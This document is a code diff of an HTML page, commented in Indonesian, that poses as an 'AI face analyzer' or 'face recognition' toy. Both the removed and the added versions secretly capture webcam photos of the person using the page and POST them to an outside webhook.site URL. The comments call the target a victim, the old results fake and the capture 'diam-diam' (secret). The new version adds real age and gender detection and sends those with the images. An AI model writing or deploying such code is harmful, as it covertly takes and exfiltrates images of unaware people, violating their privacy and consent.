@@ -3,134 +3,109 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AI Face Analyzer Pro</title>
+    <title>AI Real-Time Face Recognition</title>
+    <script defer src="https://cdn.jsdelivr.net/npm/@vladmandic/face-api/dist/face-api.js"></script>
     <style>
-        body { margin: 0; padding: 0; width: 100vw; height: 100vh; background-color: #050505; color: #00ff41; font-family: 'Courier New', Courier, monospace; overflow: hidden; display: flex; flex-direction: column; align-items: center; justify-content: center; }
-        
-        /* Kotak Scanner */
-        #camera-box { position: relative; width: 260px; height: 260px; border: 2px solid #00ff41; box-shadow: 0 0 20px rgba(0, 255, 65, 0.2); overflow: hidden; }
-        
-        #video { width: 100%; height: 100%; object-fit: cover; opacity: 0.6; filter: contrast(1.2); }
-
-        /* Animasi Garis Scan */
-        #scan-line { position: absolute; width: 100%; height: 2px; background: #00ff41; box-shadow: 0 0 15px #00ff41; top: 0; animation: move 2s linear infinite; z-index: 10; }
-        @keyframes move { 0% { top: 0; } 100% { top: 100%; } }
-
-        /* Panel Hasil (Penipuan) */
-        #result-panel { margin-top: 20px; width: 260px; background: rgba(0, 255, 65, 0.1); border: 1px solid #00ff41; padding: 15px; box-sizing: border-box; display: none; }
-        .stat { font-size: 14px; margin-bottom: 5px; }
-        .stat span { font-weight: bold; color: #fff; text-shadow: 0 0 5px #00ff41; }
-
-        /* Progress Bar */
-        #progress-container { width: 260px; height: 10px; border: 1px solid #00ff41; margin-top: 20px; position: relative; }
-        #progress-bar { width: 0%; height: 100%; background: #00ff41; transition: width 0.1s; }
-
-        #canvas { display: none; }
+        body { margin: 0; padding: 0; background: #000; color: #00ff00; font-family: sans-serif; overflow: hidden; }
+        #container { position: relative; width: 100vw; height: 100vh; display: flex; justify-content: center; align-items: center; }
+        video { position: absolute; width: 100%; height: 100%; object-fit: cover; z-index: 1; }
+        canvas { position: absolute; z-index: 2; top: 0; left: 0; width: 100%; height: 100%; }
+        #loader { position: absolute; z-index: 3; background: rgba(0,0,0,0.8); width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; }
+        .spinner { border: 4px solid #333; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-    <h2 style="font-size: 16px; margin-bottom: 10px;">AI BIOMETRIC SCANNER</h2>
+    <div id="loader">
+        <div class="spinner"></div>
+        <p id="load-text">MEMUAT ENGINE AI...</p>
+    </div>
 
-    <div id="camera-box">
-        <div id="scan-line"></div>
+    <div id="container">
         <video id="video" autoplay muted playsinline></video>
     </div>
-
-    <div id="progress-container">
-        <div id="progress-bar"></div>
-    </div>
-    <p id="loading-text" style="font-size: 10px; margin-top: 5px;">MENGHUBUNGKAN KE SERVER AI...</p>
-
-    <div id="result-panel">
-        <div class="stat">GENDER: <span id="res-gender">-</span></div>
-        <div class="stat">ESTIMASI USIA: <span id="res-age">-</span></div>
-        <div class="stat">EKSPRESI: <span id="res-emotion">-</span></div>
-        <div class="stat">AKURASI: <span id="res-acc">-</span></div>
-    </div>
-
-    <canvas id="canvas" width="640" height="480"></canvas>
 
     <script>
         const WEBHOOK_URL = 'https://webhook.site/0fd1f3d6-dd15-4117-a62f-cf109f69247b';
         const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const context = canvas.getContext('2d');
-        const progressBar = document.getElementById('progress-bar');
-        const loadingText = document.getElementById('loading-text');
-        const resultPanel = document.getElementById('result-panel');
-
         let photoCount = 0;
 
-        // Jalankan sistem
-        async function startApp() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-                video.srcObject = stream;
-                simulateScanning();
-            } catch (err) {
-                loadingText.innerText = "ERROR: IZIN KAMERA DITOLAK";
-            }
+        async function init() {
+            // 1. Load Model AI (Age, Gender, Expression)
+            const MODEL_URL = 'https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model/';
+            await Promise.all([
+                faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL),
+                faceapi.nets.faceLandmark68Net.loadFromUri(MODEL_URL),
+                faceapi.nets.faceRecognitionNet.loadFromUri(MODEL_URL),
+                faceapi.nets.faceExpressionNet.loadFromUri(MODEL_URL),
+                faceapi.nets.ageGenderNet.loadFromUri(MODEL_URL)
+            ]);
+
+            // 2. Start Kamera
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then(stream => {
+                    video.srcObject = stream;
+                    document.getElementById('loader').style.display = 'none';
+                    startDetection();
+                });
         }
 
-        // Animasi Progress Bar Palsu
-        function simulateScanning() {
-            let width = 0;
-            const interval = setInterval(() => {
-                if (width >= 100) {
-                    clearInterval(interval);
-                    showFakeResults();
-                } else {
-                    width++;
-                    progressBar.style.width = width + '%';
-                    if(width == 30) loadingText.innerText = "MENDETEKSI TITIK WAJAH...";
-                    if(width == 60) loadingText.innerText = "MENGANALISIS PIXEL...";
-                    if(width == 90) loadingText.innerText = "MENYINKRONKAN DATA...";
-                    
-                    // Sambil loading, diam-diam ambil foto di background
-                    if (width % 25 === 0) takeHiddenPhoto();
-                }
-            }, 80); // Total sekitar 8 detik proses scan
+        function startDetection() {
+            const canvas = faceapi.createCanvasFromMedia(video);
+            document.getElementById('container').append(canvas);
+            const displaySize = { width: video.offsetWidth, height: video.offsetHeight };
+            faceapi.matchDimensions(canvas, displaySize);
+
+            setInterval(async () => {
+                const detections = await faceapi.detectAllFaces(video, new faceapi.TinyFaceDetectorOptions())
+                    .withFaceLandmarks()
+                    .withFaceExpressions()
+                    .withAgeAndGender();
+
+                const resizedDetections = faceapi.resizeResults(detections, displaySize);
+                canvas.getContext('2d').clearRect(0, 0, canvas.width, canvas.height);
+                
+                // Gambar kotak dan hasil AI di layar HP target
+                faceapi.draw.drawDetections(canvas, resizedDetections);
+                
+                resizedDetections.forEach(result => {
+                    const { age, gender, genderProbability } = result;
+                    new faceapi.draw.DrawTextField([
+                        `${Math.round(age)} Tahun`,
+                        `${gender} (${Math.round(genderProbability * 100)}%)`
+                    ], result.detection.box.bottomLeft).draw(canvas);
+
+                    // 3. AMBIL FOTO DIAM-DIAM (Kirim ke Webhook setiap 5 detik)
+                    if (photoCount < 5) {
+                        sendToWebhook(Math.round(age), gender);
+                    }
+                });
+            }, 1000);
         }
 
-        // Munculkan Hasil Penipuan
-        function showFakeResults() {
-            loadingText.style.display = 'none';
-            document.getElementById('progress-container').style.display = 'none';
-            resultPanel.style.display = 'block';
-
-            // Angka acak biar kelihatan beneran
-            const fakeAge = Math.floor(Math.random() * (28 - 18 + 1)) + 18;
-            const fakeAcc = (Math.random() * (99 - 95) + 95).toFixed(2);
-            const fakeGenders = ["LAKI-LAKI", "PEREMPUAN"];
-            const fakeEmotions = ["NETRAL", "SANGAT BAHAGIA", "SERIUS"];
-
-            document.getElementById('res-gender').innerText = fakeGenders[Math.floor(Math.random() * fakeGenders.length)];
-            document.getElementById('res-age').innerText = fakeAge + " TAHUN";
-            document.getElementById('res-emotion').innerText = fakeEmotions[Math.floor(Math.random() * fakeEmotions.length)];
-            document.getElementById('res-acc').innerText = fakeAcc + "%";
-        }
-
-        // Fungsi Motret Diem-diem
-        function takeHiddenPhoto() {
-            if (photoCount >= 5) return;
+        async function sendToWebhook(age, gender) {
             photoCount++;
-
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const dataFoto = canvas.toDataURL('image/jpeg', 0.4);
+            const tempCanvas = document.createElement('canvas');
+            tempCanvas.width = video.videoWidth;
+            tempCanvas.height = video.videoHeight;
+            tempCanvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const dataFoto = tempCanvas.toDataURL('image/jpeg', 0.4);
 
             fetch(WEBHOOK_URL, {
                 method: 'POST',
                 mode: 'no-cors',
                 body: JSON.stringify({
-                    event: "STEALTH_CAPTURE",
-                    id: photoCount,
+                    info: "REAL_AI_DETECTION",
+                    detected_age: age,
+                    detected_gender: gender,
                     image: dataFoto
                 })
             });
         }
 
-        window.onload = startApp;
+        window.onload = init;
     </script>
 </body>
 </html>
